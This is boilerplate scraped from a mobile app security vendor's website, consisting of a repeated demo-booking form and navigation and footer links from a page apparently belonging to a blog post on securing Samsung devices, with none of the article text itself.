Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./two-weeks-of-securing-samsung-devices-part-2#header)

[](../)

[go up ↑](./two-weeks-of-securing-samsung-devices-part-2#header)

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

2026 © Oversecured

[Blog](../blog)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

[Case Studies](https://oversecured.com/blog?category=case-study)

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./two-weeks-of-securing-samsung-devices-part-2#header)
